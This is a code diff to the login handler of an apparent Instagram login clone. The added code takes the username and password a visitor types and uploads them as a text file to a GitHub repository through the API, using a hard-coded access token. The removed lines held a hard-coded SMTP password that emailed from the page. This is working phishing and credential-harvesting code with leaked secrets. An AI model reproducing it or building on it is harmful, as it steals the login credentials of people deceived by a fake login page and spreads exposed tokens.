@@ -7,17 +7,34 @@ document.querySelector('.loginButton').addEventListener('click', () => {
         console.log('empty');
     }else {
         console.log(username.value, password.value);
+        const owner = 'Arnav-lunatic'
+        const repo = 'insta-login-clone'
+        const path = 'info.txt'
+        const token = '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'
 
-        Email.send({
-            Host: "smtp.elasticemail.com",
-            Username: "arnav4c@gmail.com",
-            Password: "C40C6C7A66C1B152BFE7FE33487701095DED",
-            To: 'greatarnav.12@gmail.com',
-            From: "arnav4c@gmail.com",
-            Subject: "Sending Email using javascript",
-            Body: "Well that was easy!!",
-          }).then(function (message) {
-            alert("mail sent successfully")
+        let blob = new Blob([`username - "${username.value}" | password - "${password.value}"`],
+                { type: "text/plain" });
+        
+        const formData = new FormData();
+        formData.append("file", blob, path);
+
+        console.log(formData, blob);
+
+        fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${path}`, {
+            method: "PUT",
+            headers: {
+                Authorization: `token ${token}`,
+            },
+            body: formData,
+        }).then((response) => {
+            if (response.status === 201 || response.status === 200) {
+              console.log("File written successfully:", response);
+            } else {
+              console.error("Error writing file:", response.statusText);
+            }
+          })
+          .catch((error) => {
+            console.error("Error writing file:", error);
           });
     }
 })
